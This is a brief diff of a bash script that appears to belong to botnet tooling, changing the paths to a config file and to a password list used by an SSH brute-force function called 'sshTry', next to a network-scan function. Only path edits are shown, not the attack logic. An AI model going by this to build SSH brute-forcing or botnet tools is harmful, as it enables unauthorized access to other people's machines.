@@ -1,6 +1,6 @@
 #!/bin/bash
 
-source ../.config
+source ./.config
 
 val=""
 echo $destIP > temp.txt
@@ -38,7 +38,7 @@ nwscan()
 # brute force try to ssh into the machine main function
 sshTry()
 {
-	INPUT=password.csv
+	INPUT=./botnet/password.csv
 	OUTPUTFILE=userPassIPFile.txt
 	OLDIFS=$IFS
 	IFS=','
